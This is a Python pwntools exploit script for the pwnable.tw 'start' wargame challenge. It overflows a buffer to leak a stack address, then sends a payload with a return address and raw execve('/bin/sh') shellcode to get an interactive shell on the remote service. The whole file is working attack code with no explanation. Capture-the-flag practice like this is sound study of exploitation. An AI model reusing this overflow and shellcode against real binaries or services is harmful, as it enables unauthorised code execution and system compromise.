#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

local = False
elf = 'start' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10000
    r = remote(ip,port)

context.arch = 'i386'

shellcode = asm('''
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov al, 0xb
int 0x80
''')

pay = 'a'*20+p32(0x08048087)
raw_input("aaa")

r.recv()
r.send(pay)

esp = int(u32(r.recv()[:4]))
print hex(esp)

payload =  'a' *  20 + p32(esp+ 20) +"\x31\xc0\x99\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
r.send(payload)
r.interactive()
